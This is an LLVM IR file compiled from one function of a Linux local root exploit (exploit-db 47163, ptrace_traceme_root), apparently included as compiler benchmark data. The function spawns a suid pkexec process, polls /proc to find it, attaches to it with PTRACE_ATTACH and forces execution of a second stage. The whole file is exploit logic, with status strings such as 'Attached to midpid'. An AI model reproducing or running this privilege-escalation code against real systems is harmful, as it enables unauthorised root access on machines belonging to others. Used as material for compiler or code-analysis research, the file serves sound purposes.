; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47163.c_ptrace_traceme_root.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47163.c_ptrace_traceme_root.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [22 x i8] c"[.] Using helper: %s\0A\00", align 1
@helper_path = common dso_local global i32 0, align 4
@block_pipe = common dso_local global i32* null, align 8
@O_CLOEXEC = common dso_local global i32 0, align 4
@O_DIRECT = common dso_local global i32 0, align 4
@F_SETPIPE_SZ = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [36 x i8] c"[.] Spawning suid process (%s) ...\0A\00", align 1
@pkexec_path = common dso_local global i32 0, align 4
@ptrace_traceme_root.middle_stack = internal global [1048576 x i8] zeroinitializer, align 16
@middle_main = common dso_local global i32 0, align 4
@CLONE_VM = common dso_local global i32 0, align 4
@CLONE_VFORK = common dso_local global i32 0, align 4
@SIGCHLD = common dso_local global i32 0, align 4
@middle_success = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [14 x i8] c"/proc/%d/comm\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [24 x i8] c"[.] Tracing midpid ...\0A\00", align 1
@PTRACE_ATTACH = common dso_local global i32 0, align 4
@dummy_status = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [24 x i8] c"[~] Attached to midpid\0A\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"stage2\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @ptrace_traceme_root() #0 {
  %1 = alloca i8, align 1
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [16 x i8], align 16
  %5 = alloca i32, align 4
  %6 = load i32, i32* @helper_path, align 4
  %7 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i32 %6)
  %8 = load i32*, i32** @block_pipe, align 8
  %9 = load i32, i32* @O_CLOEXEC, align 4
  %10 = load i32, i32* @O_DIRECT, align 4
  %11 = or i32 %9, %10
  %12 = call i32 @pipe2(i32* %8, i32 %11)
  %13 = call i8* @SAFE(i32 %12)
  %14 = load i32*, i32** @block_pipe, align 8
  %15 = getelementptr inbounds i32, i32* %14, i64 0
  %16 = load i32, i32* %15, align 4
  %17 = load i32, i32* @F_SETPIPE_SZ, align 4
  %18 = call i32 @fcntl(i32 %16, i32 %17, i32 4096)
  %19 = call i8* @SAFE(i32 %18)
  store i8 0, i8* %1, align 1
  %20 = load i32*, i32** @block_pipe, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 1
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @write(i32 %22, i8* %1, i32 1)
  %24 = call i8* @SAFE(i32 %23)
  %25 = load i32, i32* @pkexec_path, align 4
  %26 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0), i32 %25)
  %27 = load i32, i32* @middle_main, align 4
  %28 = load i32, i32* @CLONE_VM, align 4
  %29 = load i32, i32* @CLONE_VFORK, align 4
  %30 = or i32 %28, %29
  %31 = load i32, i32* @SIGCHLD, align 4
  %32 = or i32 %30, %31
  %33 = call i32 @clone(i32 %27, i8* getelementptr inbounds (i8, i8* getelementptr inbounds ([1048576 x i8], [1048576 x i8]* @ptrace_traceme_root.middle_stack, i64 0, i64 0), i64 1048576), i32 %32, i32* null)
  %34 = call i8* @SAFE(i32 %33)
  store i8* %34, i8** %2, align 8
  %35 = load i32, i32* @middle_success, align 4
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %38, label %37

37:                                               ; preds = %0
  ret i32 1

38:                                               ; preds = %0
  br label %39

39:                                               ; preds = %38, %60
  %40 = load i8*, i8** %2, align 8
  %41 = call i32 @tprintf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0), i8* %40)
  %42 = load i32, i32* @O_RDONLY, align 4
  %43 = call i32 @open(i32 %41, i32 %42)
  store i32 %43, i32* %3, align 4
  %44 = load i32, i32* %3, align 4
  %45 = getelementptr inbounds [16 x i8], [16 x i8]* %4, i64 0, i64 0
  %46 = call i32 @read(i32 %44, i8* %45, i32 15)
  %47 = call i8* @SAFE(i32 %46)
  %48 = ptrtoint i8* %47 to i32
  store i32 %48, i32* %5, align 4
  %49 = load i32, i32* %5, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [16 x i8], [16 x i8]* %4, i64 0, i64 %50
  store i8 0, i8* %51, align 1
  %52 = getelementptr inbounds [16 x i8], [16 x i8]* %4, i64 0, i64 0
  %53 = call i8* @strchrnul(i8* %52, i8 signext 10)
  store i8 0, i8* %53, align 1
  %54 = getelementptr inbounds [16 x i8], [16 x i8]* %4, i64 0, i64 0
  %55 = load i32, i32* @helper_path, align 4
  %56 = call i32 @basename(i32 %55)
  %57 = call i64 @strncmp(i8* %54, i32 %56, i32 15)
  %58 = icmp eq i64 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %39
  br label %62

60:                                               ; preds = %39
  %61 = call i32 @usleep(i32 100000)
  br label %39

62:                                               ; preds = %59
  %63 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %64 = load i32, i32* @PTRACE_ATTACH, align 4
  %65 = load i8*, i8** %2, align 8
  %66 = call i32 @ptrace(i32 %64, i8* %65, i32 0, i32* null)
  %67 = call i8* @SAFE(i32 %66)
  %68 = load i8*, i8** %2, align 8
  %69 = call i32 @waitpid(i8* %68, i32* @dummy_status, i32 0)
  %70 = call i8* @SAFE(i32 %69)
  %71 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  %72 = load i8*, i8** %2, align 8
  %73 = call i32 @force_exec_and_wait(i8* %72, i32 0, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %74 = load i32, i32* @EXIT_SUCCESS, align 4
  %75 = call i32 @exit(i32 %74) #3
  unreachable
}

declare dso_local i32 @dprintf(i8*, ...) #1

declare dso_local i8* @SAFE(i32) #1

declare dso_local i32 @pipe2(i32*, i32) #1

declare dso_local i32 @fcntl(i32, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @clone(i32, i8*, i32, i32*) #1

declare dso_local i32 @open(i32, i32) #1

declare dso_local i32 @tprintf(i8*, i8*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i8* @strchrnul(i8*, i8 signext) #1

declare dso_local i64 @strncmp(i8*, i32, i32) #1

declare dso_local i32 @basename(i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @ptrace(i32, i8*, i32, i32*) #1

declare dso_local i32 @waitpid(i8*, i32*, i32) #1

declare dso_local i32 @force_exec_and_wait(i8*, i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
